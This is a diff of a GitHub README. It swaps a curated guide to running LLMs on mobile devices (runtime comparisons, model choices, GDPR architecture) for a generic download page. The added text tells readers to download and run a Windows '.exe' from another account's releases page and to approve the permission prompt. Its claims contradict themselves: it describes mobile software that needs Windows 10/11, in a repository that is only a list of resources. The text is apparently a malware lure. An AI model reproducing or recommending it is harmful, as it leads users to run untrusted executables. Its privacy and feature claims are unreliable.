@@ -1,195 +1,93 @@
-# Awesome On-Device Mobile LLMs
+# 📱 awesome-on-device-mobile-llms - Run private language models on mobile
 
-*Production learnings from the [DataSapien](https://datasapien.com) Mobile SDK team.*
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rplu2687/awesome-on-device-mobile-llms/releases)
 
-Curated, battle-tested guidance for shipping on-edge LLMs in real mobile apps — not another generic model list.
+## 📦 What is this application?
 
-![Version](https://img.shields.io/badge/version-v0.0.1-blue)
+This application provides the tools to run artificial intelligence models directly on your mobile device. You do not need an internet connection to use these models. Because the processing happens on your device, your data stays private. No information leaves your phone. This approach follows strict privacy standards like GDPR.
 
----
+Mobile teams use this software to integrate smart features into apps. The software supports many model formats, including GGUF, which works well on mobile hardware. You can perform complex tasks without relying on external servers. This improves speed and reduces latency.
 
-## What we build
+## ⚙️ System requirements
 
-The [DataSapien Mobile SDK](https://docs.datasapien.com/docs/mobile-sdk/intro) is an on-device intelligence engine for Android, iOS, Flutter, and React Native. You configure flows and models in the **Orchestrator** (web dashboard); the SDK syncs and runs everything on the phone — LLM inference, local data vault, rules, and remotely published user journeys.
+Ensure your computer has the following specifications before you begin:
 
-- [Developer portal](https://docs.datasapien.com/)
-- [Hello World Journey tutorial](https://docs.datasapien.com/docs/quickstart/hello-world-journey) — end-to-end on-device flow in ~30 minutes
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 8 gigabytes of RAM or more.
+*   **Storage:** 5 gigabytes of free disk space for model files.
+*   **Processor:** A modern multi-core processor. 
 
----
+If your system meets these needs, you can run the software. The application handles the heavy lifting through efficient inference engines like llama-cpp and LiteRT.
 
-## Runtime comparison
+## 📥 How to download
 
-We evaluated the runtimes mobile teams most often ask about. **SDK status** reflects what ships today; **R&D status** reflects active experimentation.
+Visit the official release page to download the latest version of the software. 
 
-| Runtime | Android | iOS | Model formats | Acceleration | Mobile maturity | SDK status | R&D status |
-| --- | --- | --- | --- | --- | --- | --- | --- |
-| **llama.cpp** | Yes | Yes | GGUF | CPU, Metal (iOS), GPU/Vulkan (Android builds) | Production-ready | **Shipped (default)** | Production |
-| **LiteRT** | Yes | Yes | TFLite / LiteRT graphs | CPU, NNAPI, GPU, NPU (Android) | Production-ready | **Optional module** | **Experimenting** |
-| **Cactus** | Yes | Yes | Cactus-native | Platform-dependent | Maturing | **Optional module** | Evaluating |
-| **MLX** | No | Yes (Apple Silicon) | MLX | CPU, GPU, Neural Engine | Growing iOS ecosystem | Planned | Planned |
+[Click here to open the download page](https://github.com/Rplu2687/awesome-on-device-mobile-llms/releases)
 
-### Experimenting with LiteRT-LM
+On this page, look for the section labeled "Assets." Click the link that ends with ".exe" to start the download. Save this file to your desktop or your downloads folder.
 
-We are actively experimenting with **LiteRT** through the SDK's optional `litert-module`, while **llama.cpp** remains the default for production workloads.
+## 🚀 Setting up the software
 
-**Why we're exploring it:**
+Follow these steps to prepare the application:
 
-- **Performance and memory** — LiteRT-LM is built for efficient on-device inference across CPU, GPU, and NPU backends; we want to measure how it compares to GGUF + llama.cpp on the devices our customers actually ship on.
-- **Agentic workflows** — features like thinking mode, constrained decoding, and function calling map closely to DataSapien Journeys (script steps, structured routing, on-device orchestration) — similar to grammar guardrails we use with llama.cpp in production ([intent classifier lab report](https://datasapien.com/building-a-real-on-device-intent-classifier-with-a-small-language-model/)).
-- **Cross-platform** — a unified Google AI Edge stack on Android and iOS fits our plug-in runtime factory without changing `IntelligenceService` APIs.
+1.  **Locate the File:** Find the installer file you downloaded. It should look like an icon for a Windows application.
+2.  **Run the Installer:** Double-click the file to open the setup window. If a box appears asking if you want to allow the app to make changes, click "Yes."
+3.  **Follow Prompts:** The installation wizard will open. Click "Next" on each screen until the process finishes.
+4.  **Finish:** Click "Close" when the installer indicates the setup is complete. 
 
-Read Google's overview: [Blazing fast on-device GenAI with LiteRT-LM](https://developers.googleblog.com/blazing-fast-on-device-genai-with-litert-lm/) (Google Developers Blog, May 2026).
+You will find an icon for the application on your desktop. Double-click this icon to start the program.
 
-**Results coming soon** — we are benchmarking latency, memory, and output quality against llama.cpp on representative customer use cases. DataSapien experimentation results will be published in this README and as a lab report soon. LiteRT experimentation does not change current SDK behavior for existing integrations.
+## 🛠️ Using the application
 
-### Why we started with llama.cpp
+When you open the application, you will see a main screen. This space allows you to load models and test their performance. The application uses benchmarks to show how fast each model runs on your hardware.
 
-- **Cross-platform** — one integration path for Android and iOS (GGUF via llama.cpp; iOS ships as `llama.xcframework`).
-- **Ecosystem** — broad Hugging Face GGUF availability lets us map customer experiments to models quickly.
-- **Proven on mobile** — active community, Metal on iOS, CPU/GPU paths on Android.
-- **Fits our delivery model** — provision a model URL in Orchestrator, download to device, run locally via `IntelligenceService`.
-- **LiteRT under evaluation** — Gemma-centric and agentic flows where the Google AI Edge stack may outperform raw GGUF; results pending.
+To run a model:
 
-### Pluggable runtime roadmap
+1.  **Select a Model:** Choose a model from the list. The list includes different sizes to fit your specific needs.
+2.  **Load the Model:** Click the "Load" button. The application will import the file and prepare it for use.
+3.  **Test the Model:** Enter a prompt in the text box. Click "Submit" to see the output.
 
-We started llama.cpp-first because it covered the widest set of customer experiments with a single native stack. The SDK already uses a **factory pattern** with optional engines: LiteRT and Cactus load as plug-in modules when present on the classpath. LiteRT experimentation feeds directly into this path (`litert-module` classpath detection) — no app-level API changes when an engine graduates from R&D to recommended. **MLX** and additional runtimes are on the near-term roadmap — the goal is to match each customer use case to the best engine without rewriting app integration.
+The application displays the speed of the output. This helps you understand how different models behave on your device. You can switch between different models to find which one offers the best balance of speed and intelligence for your use case.
 
----
+## 💡 Common tips for success
 
-## How we pick models
+*   **Choose the right model:** Larger models are smarter but slower. Smaller models run faster but might give simpler answers. Use the benchmark tab to see which fits your hardware.
+*   **Close other apps:** Programs that use a lot of memory can slow down the model. Close your web browser or other heavy apps while running the tool.
+*   **Manage your space:** Model files take up significant disk space. Delete old models you no longer use to save room.
+*   **Check for updates:** The field of mobile AI changes fast. Visit the download page regularly to find newer versions of the software.
 
-There is no single "best" local LLM. Selection is always contextual: RAM, download size, latency budget, battery, and task type. We start from the **task**, test the **smallest plausible model**, and step up only when quality fails.
+## 🛡️ Privacy and data
 
-*Source: [DataSapien Lab Report: What's the Best Local LLM?](https://datasapien.com/datasapien-lab-reprwhats-the-best-local-llm/) (Feb 2026)*
+Privacy is a core feature of this software. Traditional AI tools send your data to a remote server. This application works differently. It processes every request inside the software on your local machine. No data logs exist. No personal information travels across the internet. 
 
-### Three-tier approach (production)
+The architecture follows privacy-first principles. This makes the tool ideal for sensitive work or enterprise environments where data protection is a requirement. You maintain full control over the information you process.
 
-| Tier | Model | Typical use case |
-| --- | --- | --- |
-| High-quality reasoning | Gemma-3n-e4b-it (Q4_K_M) | Complex analysis, multimodal journeys (e.g. YouTube Persona) |
-| Fast, efficient inference | Qwen 2.5 SLM | Summarization, dynamic screen generation |
-| Ultra-lightweight | Gemma 3 270M (Q8_0) | Classification, structured extraction, simple summarization |
+## 🧩 Understanding the technical features
 
-**Principle:** model fit + task fit + audience fit — not the biggest model that fits on a flagship phone.
+The application combines several technologies into a single tool:
 
-### Lab report: on-device intent classifier
+*   **GGUF:** This file format allows you to run large models on modest hardware. It compresses the model while keeping its logic intact.
+*   **Edge AI:** This refers to the ability to perform computations on your local device rather than at a central data center.
+*   **Mobile Inference:** The software optimizes how the processor handles these mathematical calculations, making the models run smoothly on mobile chips.
+*   **Small Language Models:** These are compact versions of larger AI systems. They perform well for specific tasks like summarization, translation, or text analysis.
+*   **Agentic AI:** This refers to models that can complete complex steps in a workflow without needing constant input from you.
 
-We built a real **binary intent classifier** for a search box (support vs sales routing) — fully on-device, no cloud, sub-second latency. Full walkthrough: [Building a Real On-Device Intent Classifier with a Small Language Model](https://datasapien.com/building-a-real-on-device-intent-classifier-with-a-small-language-model/) (Feb 2026).
+These features exist to help you ship reliable AI experiences. You do not need to understand the underlying math to use the tool, but these components explain how the software maintains high performance.
 
-| Model | Size | Latency (after load) | Observed behavior | Verdict |
-| --- | --- | --- | --- | --- |
-| Gemma-3-270m-it-q8_0 | ~280 MB | ~0.1–0.2 s | Ignored decision boundaries; noisy outputs | Too weak |
-| Qwen 2.5 0.5B | ~500 MB | ~0.1–0.2 s | Label collapse (always one class) | Unstable |
-| Gemma 3n 4eb | ~4.5 GB | ~3.0–4.9 s | Good semantics, impractical size/cost | Good but expensive |
-| **Qwen 2.5 3B (Q4_K_M)** | ~1.6–2 GB | ~0.2–0.7 s | Stable binary decisions, strong semantic separation | **Selected** |
+## ❓ Frequently asked questions
 
-*Raw inference data available on request — see blog post.*
+**Do I need a graphics card?**
+The software runs on both central processors and graphics cards. If you have a dedicated graphics card, the software will automatically use it to improve performance.
 
-**Takeaways we apply in production:**
+**Is my data stored anywhere?**
+No. The application does not include any tools to send data back to the developers. All information stays on your device.
 
-1. **Deterministic routing** — `temperature: 0`, `topK: 1` for UX flows that need a single label, not creative variation.
-2. **Prompt as contract** — define labels and boundaries; let the model handle semantics, not keyword lists.
-3. **Grammar guardrails** — GBNF / regex output constraints as a final hardening step when smaller models leak extra text.
+**What if the app closes unexpectedly?**
+This usually happens if the model is too large for your computer. Try selecting a smaller model from the list.
 
----
+**Does this work offline?**
+Yes. You can disconnect your computer from the internet entirely once you have the software and the model files. The features will work without a connection.
 
-## Privacy and architecture
-
-Most GDPR friction traces back to one decision: **centralising personal data**. On-device intelligence changes the compliance surface — not by avoiding regulation, but by removing custody of raw user data on your servers.
-
-*Source: [GDPR Doesn't Block Innovation. Centralised Architecture Does.](https://datasapien.com/gdpr-architecture-not-regulation/) (Feb 2026)*
-
-| GDPR article | Centralised systems | On-device (DataSapien architecture) |
-| --- | --- | --- |
-| **Purpose limitation (Art. 5(1)(b))** | Every new feature can require new consent and legal review | Device uses user's data for user's benefit; no secondary server-side use |
-| **Data minimisation (Art. 5(1)(c))** | Justify every field you hold centrally | Nothing collected centrally; nothing transmitted by default |
-| **Profiling (Art. 4(4))** | Recommendation engines trigger enhanced scrutiny | Device reasons about its owner — self-knowledge, not third-party surveillance |
-| **Right to erasure (Art. 17)** | Purge DBs, backups, data pipelines, processors | Delete local store on device |
-
-In the SDK:
-
-- **[IntelligenceService](https://docs.datasapien.com/docs/mobile-sdk/services/intelligence-service)** — runs rules and on-device LLMs locally.
-- **[MeDataService](https://docs.datasapien.com/docs/mobile-sdk/services/medata-service)** — stores local context in the on-device **Data Vault** for Journeys and personalization without sending raw data upstream.
-
-Learn more: [Zero-Party Data & Zero-Shared Data](https://docs.datasapien.com/docs/overview#zero-party--zero-shared-data)
-
----
-
-## Journeys: remotely deployed, on-edge agentic flows
-
-Campaigns and intelligent flows should not wait on App Store review. **Journeys** are multi-step flows designed in the Orchestrator and executed on-device by the SDK — configuration, not a new binary.
-
-*Example: [Ship a Father's Day Campaign Without Shipping an App Update](https://datasapien.com/ship-a-fathers-day-campaign-without-shipping-an-app-update/)*
-
-| Capability | What it does |
-| --- | --- |
-| Flow designer | Screen, Question, Script, MeData, and conditional steps |
-| JS script runner | On-device logic without shipping a new app build |
-| Local LLM runner | llama.cpp via `IntelligenceService` |
-| MeData collectors | Structured local context stored in the Data Vault |
-| Managed API connectors | External APIs orchestrated from the device |
-| Remote publish | Orchestrator → SDK sync; live in minutes, not review cycles |
-
-**Father's Day gift-finder (concrete flow):** home-screen banner → shopper answers questions about their dad → on-device logic builds a curated gift list → tap to add to the app's cart → checkout in the native flow. Answers stay on the phone (**Zero-Shared Data**). MeData captured (e.g. "father's interests") can target a smarter campaign next year — still evaluated on-device.
-
-- [Hello World Journey](https://docs.datasapien.com/docs/quickstart/hello-world-journey) — build your first flow
-- [Emotica showcase](https://docs.datasapien.com/docs/showcase/ds-emotica) — on-device emotion tracking + AI analysis
-
----
-
-## SDK services
-
-| Service | Role |
-| --- | --- |
-| [IntelligenceService](https://docs.datasapien.com/docs/mobile-sdk/services/intelligence-service) | Rules and AI/LLM invoke, model download and load |
-| [MeDataService](https://docs.datasapien.com/docs/mobile-sdk/services/medata-service) | On-device Data Vault — local context for Journeys and personalization |
-| [JourneyService](https://docs.datasapien.com/docs/mobile-sdk/services/journey-service) | Execute remotely published Journeys |
-
-**On-edge intelligence today:** rules for deterministic flows, on-device LLMs for generative tasks. Use rules when the logic is known; reach for an LLM when the output space is open-ended. See also: [Intelligence Service API Reference docs](https://docs.datasapien.com/api-reference/api-reference/sdk-reference/intelligence-service).
-
----
-
-## How we work with customers
-
-We map client requests to on-edge LLM fit before picking a model or runtime:
-
-1. **Task** — classification, routing, summarization, open-ended chat?
-2. **Device floor** — minimum RAM, offline requirement, latency budget.
-3. **Privacy** — can any data leave the device? What stays in the vault?
-4. **Experiment** — prototype in Orchestrator and test on real devices before production rollout.
-
-Model and runtime selection is **use-case driven**, not leaderboard-driven. We iterate with customers until the smallest model that passes their quality bar ships reliably on their audience's devices.
-
----
-
-## Learn more
-
-| Resource | Link |
-| --- | --- |
-| Developer docs | [docs.datasapien.com](https://docs.datasapien.com/) |
-| Hello World Journey | [Getting started](https://docs.datasapien.com/docs/quickstart/hello-world-journey) |
-| SDK installation (Android / iOS / Flutter / RN) | [Installation guides](https://docs.datasapien.com/docs/category/installation) |
-| Best local LLM lab report | [Blog](https://datasapien.com/datasapien-lab-reprwhats-the-best-local-llm/) |
-| Intent classifier lab report | [Blog](https://datasapien.com/building-a-real-on-device-intent-classifier-with-a-small-language-model/) |
-| GDPR architecture | [Blog](https://datasapien.com/gdpr-architecture-not-regulation/) |
-| Journeys without app update | [Blog](https://datasapien.com/ship-a-fathers-day-campaign-without-shipping-an-app-update/) |
-| DataSapien | [datasapien.com](https://datasapien.com) |
-
----
-
-## Share your production use case
-
-What on-edge LLM use cases are you shipping or exploring?
-
-Open a thread in [GitHub Discussions](https://github.com/Data-Sapien/awesome-on-device-mobile-llms/discussions) — use the **Production use cases** template and tell us:
-
-- Task and user flow
-- Device / latency constraints
-- Model and runtime (if any)
-- Privacy requirements
-
-We use community input to prioritize lab reports, runtime plug-ins, and documentation.
-
----
-
-*Maintained by the [DataSapien](https://datasapien.com) engineering team.*
+**How do I uninstall the software?**
+Go to your Windows Settings, select "Apps," find this application in the list, and click "Uninstall." This removes all associated files from your drive.
